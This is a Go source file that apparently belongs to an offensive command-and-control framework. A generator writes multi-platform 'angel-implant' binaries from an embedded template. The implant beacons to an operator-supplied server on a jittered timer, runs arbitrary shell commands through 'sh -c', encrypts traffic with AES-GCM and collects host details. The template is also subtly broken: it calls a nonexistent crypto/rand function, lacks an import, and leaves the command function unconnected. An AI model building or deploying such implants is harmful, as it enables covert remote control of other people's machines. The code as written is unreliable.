package generate

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"text/template"
	"time"
)

type Generator struct {
	config *Config
	outputDir string
}

type Config struct {
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	Format     string `json:"format"`
	Sleep      int    `json:"sleep"`
	Jitter     float64 `json:"jitter"`
	Profile    string `json:"profile"`
	Encryption string `json:"encryption"`
	Listener   string `json:"listener"`
}

type ImplantConfig struct {
	Goos       string
	Goarch     string
	Version    string
	BuildTime  string
	SleepTime  int
	Jitter     float64
	ServerURL  string
	Profile    string
	Encryption string
}

func NewGenerator(cfg *Config, outputDir string) *Generator {
	if cfg == nil {
		cfg = &Config{
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			Format:     "exe",
			Sleep:      30,
			Jitter:     0.25,
			Profile:    "default",
			Encryption: "aes-256-gcm",
		}
	}
	return &Generator{config: cfg, outputDir: outputDir}
}

func (g *Generator) Generate(serverURL string) (string, error) {
	if err := os.MkdirAll(g.outputDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create output dir: %w", err)
	}

	implantCfg := &ImplantConfig{
		Goos:       g.config.OS,
		Goarch:     g.config.Arch,
		Version:    "1.0.0",
		BuildTime:  time.Now().Format(time.RFC3339),
		SleepTime:  g.config.Sleep,
		Jitter:     g.config.Jitter,
		ServerURL:  serverURL,
		Profile:    g.config.Profile,
		Encryption: g.config.Encryption,
	}

	filename := fmt.Sprintf("angel-implant-%s-%s", g.config.OS, g.config.Arch)
	if g.config.OS == "windows" {
		filename += ".exe"
	}

	outputPath := filepath.Join(g.outputDir, filename)

	tmpl, err := template.New("implant").Parse(implantTemplate)
	if err != nil {
		return "", fmt.Errorf("failed to parse template: %w", err)
	}

	file, err := os.Create(outputPath)
	if err != nil {
		return "", fmt.Errorf("failed to create output file: %w", err)
	}
	defer file.Close()

	if err := tmpl.Execute(file, implantCfg); err != nil {
		return "", fmt.Errorf("failed to execute template: %w", err)
	}

	return outputPath, nil
}

func (g *Generator) GetSupportedPlatforms() []map[string]string {
	return []map[string]string{
		{"os": "windows", "arch": "amd64", "format": "exe"},
		{"os": "windows", "arch": "386", "format": "exe"},
		{"os": "linux", "arch": "amd64", "format": "elf"},
		{"os": "linux", "arch": "386", "format": "elf"},
		{"os": "linux", "arch": "arm64", "format": "elf"},
		{"os": "darwin", "arch": "amd64", "format": "macho"},
		{"os": "darwin", "arch": "arm64", "format": "macho"},
		{"os": "android", "arch": "arm64", "format": "elf"},
	}
}

var implantTemplate = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

const (
	sleepTime  = {{.SleepTime}}
	jitter     = {{.Jitter}}
	serverURL  = "{{.ServerURL}}"
	profile    = "{{.Profile}}"
	encryption = "{{.Encryption}}"
	version    = "{{.Version}}"
	buildTime  = "{{.BuildTime}}"
)

func main() {
	for {
		time.Sleep(time.Duration(sleepTime) * time.Second)
		jitterDuration := time.Duration(float64(time.Second) * jitter * (rand.Float64()*2 - 1))
		time.Sleep(jitterDuration)
		checkIn()
	}
}

func checkIn() {
	resp, err := http.Get(serverURL + "/api/v1/health")
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func executeCommand(cmd string) (string, error) {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func encodeBase64(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func decodeBase64(data string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(data)
}

func getHostname() string {
	hostname, _ := os.Hostname()
	return hostname
}

func getOS() string {
	return runtime.GOOS
}

func getArch() string {
	return runtime.GOARCH
}
`
